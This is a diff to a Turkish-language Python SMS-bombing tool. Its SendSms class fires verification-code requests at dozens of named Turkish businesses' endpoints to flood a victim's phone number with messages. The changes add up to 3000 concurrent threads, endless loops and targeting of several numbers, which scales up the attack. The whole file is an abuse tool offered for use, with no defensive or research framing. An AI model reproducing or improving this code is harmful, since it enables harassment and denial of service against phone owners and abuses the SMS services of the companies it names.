@@ -7,23 +7,15 @@ except ImportError:
     print("Gerekli modüller indiriliyor...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3==1.26.13", "uuid==1.30", "colorama==0.3.9", "requests==2.31.0"])
 finally:
-    import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid
+    import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid, colorama
 
 from colorama import Fore, Style
 from time import sleep
 from os import system
 from concurrent.futures import ThreadPoolExecutor, wait
-import requests
 from random import choice
 from string import ascii_lowercase
-from colorama import Fore, Style
-import requests, urllib3, uuid
-import requests
-from random import choice
-from string import ascii_lowercase
-from colorama import Fore, Style
-import requests, urllib3, uuid
-
+import math
 
 class SendSms():
     adet = 0
@@ -1473,6 +1465,24 @@ for attribute in dir(SendSms):
         if attribute.startswith('__') == False:
             servisler_sms.append(attribute)
 
+def split_services(services, thread_count):
+    chunk_size = math.ceil(len(services) / thread_count)
+    return [services[i:i + chunk_size] for i in range(0, len(services), chunk_size)]
+
+def run_services(sms, service_list, kere=None, aralik=0):
+    if kere is None:  
+        while True:
+            for service in service_list:
+                exec(f"sms.{service}()")
+                sleep(aralik)
+    else:  
+        while sms.adet < kere:
+            for service in service_list:
+                if sms.adet >= kere:
+                    break
+                exec(f"sms.{service}()")
+                sleep(aralik)
+
 
             
 while 1:
@@ -1504,6 +1514,19 @@ while 1:
         print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
         sleep(3)
         continue
+    if menu in [1, 2]:
+        # Thread sayısını al
+        system("cls||clear")
+        try:
+            thread_count = int(input(Fore.LIGHTYELLOW_EX + "Thread sayısını giriniz [1-3000]: " + Fore.LIGHTGREEN_EX))
+            if thread_count < 1 or thread_count > 3000:
+                raise ValueError
+        except ValueError:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Geçersiz thread sayısı!")
+            sleep(3)
+            continue
+
     if menu == 1:
         system("cls||clear")
         print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
@@ -1570,33 +1593,24 @@ while 1:
             sleep(3)
             continue
         system("cls||clear")
-        if kere is None: 
-            sms = SendSms(tel_no, mail)
-            while True:
-                for attribute in dir(SendSms):
-                    attribute_value = getattr(SendSms, attribute)
-                    if callable(attribute_value):
-                        if attribute.startswith('__') == False:
-                            exec("sms."+attribute+"()")
-                            sleep(aralik)
-        for i in tel_liste:
-            sms = SendSms(i, mail)
-            if isinstance(kere, int):
-                    while sms.adet < kere:
-                        for attribute in dir(SendSms):
-                            attribute_value = getattr(SendSms, attribute)
-                            if callable(attribute_value):
-                                if attribute.startswith('__') == False:
-                                    if sms.adet == kere:
-                                        break
-                                    exec("sms."+attribute+"()")
-                                    sleep(aralik)
-        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
-        input()
-    elif menu == 3:
-        system("cls||clear")
-        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
-        break
+
+        # Thread'leri başlat
+        service_chunks = split_services(servisler_sms, thread_count)
+        with ThreadPoolExecutor(max_workers=thread_count) as executor:
+            futures = []
+            for tel_no in tel_liste:
+                sms = SendSms(tel_no, mail)
+                for chunk in service_chunks:
+                    futures.append(
+                        executor.submit(run_services, sms, chunk, kere, aralik)
+                    )
+            try:
+                wait(futures)
+            except KeyboardInterrupt:
+                system("cls||clear")
+                print("\nİşlem iptal edildi...")
+                sleep(2)
+
     elif menu == 2:
         system("cls||clear")
         print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
@@ -1622,99 +1636,27 @@ while 1:
             sleep(3)
             continue
         system("cls||clear")
+
         send_sms = SendSms(tel_no, mail)
+        service_chunks = split_services(servisler_sms, thread_count)
+        
         try:
             while True:
-                with ThreadPoolExecutor() as executor:
-                    futures = [
-                        executor.submit(send_sms.Akasya),
-                        executor.submit(send_sms.Akbati),
-                        executor.submit(send_sms.Ayyildiz),
-                        executor.submit(send_sms.Baydoner),
-                        executor.submit(send_sms.Beefull),
-                        executor.submit(send_sms.Bim),
-                        executor.submit(send_sms.Bisu),
-                        executor.submit(send_sms.Bodrum),
-                        executor.submit(send_sms.Clickme),
-                        executor.submit(send_sms.Dominos),
-                        executor.submit(send_sms.Englishhome),
-                        executor.submit(send_sms.Evidea),
-                        executor.submit(send_sms.File),
-                        executor.submit(send_sms.Frink),
-                        executor.submit(send_sms.Happy),
-                        executor.submit(send_sms.Hayatsu),
-                        executor.submit(send_sms.Hey),
-                        executor.submit(send_sms.Hizliecza),
-                        executor.submit(send_sms.Icq),
-                        executor.submit(send_sms.Ipragaz),
-                        executor.submit(send_sms.Istegelsin),
-                        executor.submit(send_sms.Joker),
-                        executor.submit(send_sms.KahveDunyasi),
-                        executor.submit(send_sms.KimGb),
-                        executor.submit(send_sms.Komagene),
-                        executor.submit(send_sms.Koton),
-                        executor.submit(send_sms.KuryemGelsin),
-                        executor.submit(send_sms.Macro),
-                        executor.submit(send_sms.Metro),
-                        executor.submit(send_sms.Migros),
-                        executor.submit(send_sms.Naosstars),
-                        executor.submit(send_sms.Paybol),
-                        executor.submit(send_sms.Pidem),
-                        executor.submit(send_sms.Porty),
-                        executor.submit(send_sms.Qumpara),
-                        executor.submit(send_sms.Starbucks),
-                        executor.submit(send_sms.Suiste),
-                        executor.submit(send_sms.Taksim),
-                        executor.submit(send_sms.Tasdelen),
-                        executor.submit(send_sms.Tasimacim),
-                        executor.submit(send_sms.Tazi),
-                        executor.submit(send_sms.TiklaGelsin),
-                        executor.submit(send_sms.ToptanTeslim),
-                        executor.submit(send_sms.Ucdortbes),
-                        executor.submit(send_sms.Uysal),
-                        executor.submit(send_sms.Wmf),
-                        executor.submit(send_sms.Yapp),
-                        executor.submit(send_sms.YilmazTicaret),
-                        executor.submit(send_sms.Yuffi),
-                        executor.submit(send_sms.a101),
-                        executor.submit(send_sms.defacto),
-                        executor.submit(send_sms.ikinciyeni),
-                        executor.submit(send_sms.ceptesok),
-                        executor.submit(send_sms.pisir),
-                        executor.submit(send_sms.coffy),
-                        executor.submit(send_sms.sushico),
-                        executor.submit(send_sms.kalmasin),
-                        executor.submit(send_sms.yotto),
-                        executor.submit(send_sms.aygaz),
-                        executor.submit(send_sms.pawapp),
-                        executor.submit(send_sms.mopas),
-                        executor.submit(send_sms.ninewest),
-                        executor.submit(send_sms.saka),
-                        executor.submit(send_sms.superpedestrian),
-                        executor.submit(send_sms.gofody),
-                        executor.submit(send_sms.weescooter),
-                        executor.submit(send_sms.scooby),
-                        executor.submit(send_sms.gez),
-                        executor.submit(send_sms.heyscooter),
-                        executor.submit(send_sms.jetle),
-                        executor.submit(send_sms.rabbit),
-                        executor.submit(send_sms.roombadi),
-                        executor.submit(send_sms.hizliecza),
-                        executor.submit(send_sms.signalall),
-                        executor.submit(send_sms.goyakit),
-                        executor.submit(send_sms.pinar),
-                        executor.submit(send_sms.oliz),
-                        executor.submit(send_sms.marti),
-                        executor.submit(send_sms.karma),
-                        executor.submit(send_sms.hop),
-                        executor.submit(send_sms.anadolu),
-                        executor.submit(send_sms.total),
-                        executor.submit(send_sms.englishhome),
-                        executor.submit(send_sms.petrolofisi),
-                        #bazı apileri buraya yazmayı unutmuş olabilirim ama bakmaya çok üşendim 
-                    ]
+                with ThreadPoolExecutor(max_workers=thread_count) as executor:
+                    futures = []
+                    for chunk in service_chunks:
+                        for service in chunk:
+                            futures.append(
+                                executor.submit(getattr(send_sms, service))
+                            )
                     wait(futures)
         except KeyboardInterrupt:
             system("cls||clear")
             print("\nMenüye Dönülüyor...")
             sleep(2)
+
+    elif menu == 3:
+        system("cls||clear")
+        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
+        break
+
